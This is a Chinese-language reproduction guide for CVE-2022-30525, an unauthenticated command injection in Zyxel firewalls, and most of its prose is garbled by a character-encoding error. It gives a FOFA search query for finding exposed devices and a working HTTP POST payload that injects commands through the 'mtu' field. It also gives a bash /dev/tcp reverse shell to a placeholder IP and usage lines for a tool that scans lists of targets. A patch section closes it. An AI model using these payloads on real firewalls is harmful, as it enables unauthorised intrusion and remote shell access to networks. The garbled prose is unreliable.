# CVE-2022-30525
Zyxel é˜²ç«å¢™è¿œç¨‹å‘½ä»¤æ³¨å…¥æ¼æ´žï¼ˆCVE-2022-30525ï¼‰

# 0x01 æ¼æ´žç®€ä»‹

2022 å¹´ 5 æœˆ 12 æ—¥ï¼ŒZyxelï¼ˆåˆå‹¤ï¼‰å‘å¸ƒå®‰å…¨å…¬å‘Šï¼Œä¿®å¤äº†å…¶é˜²ç«å¢™è®¾å¤‡ä¸­æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ³¨å…¥æ¼æ´žï¼ˆCVE-2022-30525ï¼‰ã€‚

è¯¥æ¼æ´žå­˜åœ¨äºŽæŸäº›Zyxelé˜²ç«å¢™ç‰ˆæœ¬çš„ CGI ç¨‹åºä¸­ï¼Œå…è®¸åœ¨æœªç»èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹åœ¨å—å½±å“è®¾å¤‡ä¸Šä»¥`nobody`ç”¨æˆ·èº«ä»½æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

ç›®å‰è¯¥æ¼æ´žçš„ç»†èŠ‚å·²ç»å…¬å¼€æŠ«éœ²ï¼Œä¸”ç›¸åº”çš„ Metasploit æ¨¡å—å·²ç»å‘å¸ƒï¼ŒæˆåŠŸåˆ©ç”¨å¯ä»¥å®žçŽ°æ–‡ä»¶ä¿®æ”¹å’Œæ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œä»¥èŽ·å¾—å¯¹ç½‘ç»œçš„åˆå§‹è®¿é—®æƒé™å¹¶å®žçŽ°æ¨ªå‘ç§»åŠ¨åˆ°å†…éƒ¨ç³»ç»Ÿã€‚



# 0x02 æ¼æ´žå½±å“

| **å—å½±å“çš„åž‹å·**               | **å—å½±å“çš„å›ºä»¶ç‰ˆæœ¬**          | **è¡¥ä¸ç‰ˆæœ¬** |
| ------------------------------ | ----------------------------- | ------------ |
| USG FLEX 100(W)ã€200ã€500ã€700 | ZLD V5.00 -ZLD V5.21 Patch 1  | ZLD V5.30    |
| USG FLEX 50(W) / USG20(W)-VPN  | ZLD V5.10 - ZLD V5.21 Patch 1 | ZLD V5.30    |
| ATPç³»åˆ—                        | ZLD V5.10 - ZLD V5.21 Patch 1 | ZLD V5.30    |
| VPNç³»åˆ—                        | ZLD V4.60 - ZLD V5.21 Patch 1 | ZLD V5.30    |

# 0x03 FOFAè¯­æ³•

```
 body="USG FLEX 100"
```


# 0x04 æ¼æ´žå¤çŽ°

æ‰¾ä¸€ä¸ªç«™ç‚¹ï¼Œç¡®è®¤ZYXELé˜²ç«å¢™ç‰¹å¾ã€‚

![image](https://user-images.githubusercontent.com/84888757/172675012-f4a4efd0-7d7d-4f8f-991b-f9a164b40fec.png)


è®¿é—®https://xx.xx.xx.xx/ztp/cgi-bin/handlerï¼Œä¿®æ”¹ä¸º`post`æ–¹å¼ï¼ŒåŠ å…¥payload

## 4.1 **æ¼æ´žéªŒè¯**

```
POST /ztp/cgi-bin/handler HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/json
Connection: close
Content-Length: 130
 
{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; ping ***.dnslog.cn;","data":"hi"}
```

## 4.2 **åå¼¹shell**

```
{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1';","data":"hi"}
```

## 4.3 åˆ©ç”¨å·¥å…·

- ðŸ”— https://github.com/Henry4E36/CVE-2022-30525

ç”¨æ³•

```
python3 CVE-2022-30525.py -u http://127.0.0.1

python3 CVE-2022-30525.py -f ip.txt
```


# 0x05 æ¼æ´žä¿®å¤

åŽ‚å•†å·²å‘å¸ƒè¡¥ä¸ä¿®å¤æ¼æ´žï¼Œç”¨æˆ·è¯·å°½å¿«æ›´æ–°è‡³å®‰å…¨ç‰ˆæœ¬ï¼šZLD V5.30ã€‚ä¸‹è½½é“¾æŽ¥å¦‚ä¸‹ï¼š
https://www.zyxel.com/support/download_landing.shtml

æ— æ³•ç«‹å³æ›´æ–°çš„ç”¨æˆ·ï¼Œå¯ä»¥ç¦ç”¨å¯¹å—å½±å“äº§å“çš„ç®¡ç† Web ç•Œé¢çš„ WAN è®¿é—®ä»¥ç¼“è§£æ­¤æ¼æ´žã€‚


# 0x06 å‚è€ƒ

- https://www.rapid7.com/blog/post/2022/05/12/cve-2022-30525-fixed-zyxel-firewall-unauthenticated-remote-command-injection/

- https://www.henry4e36.top/index.php/archives/42.html
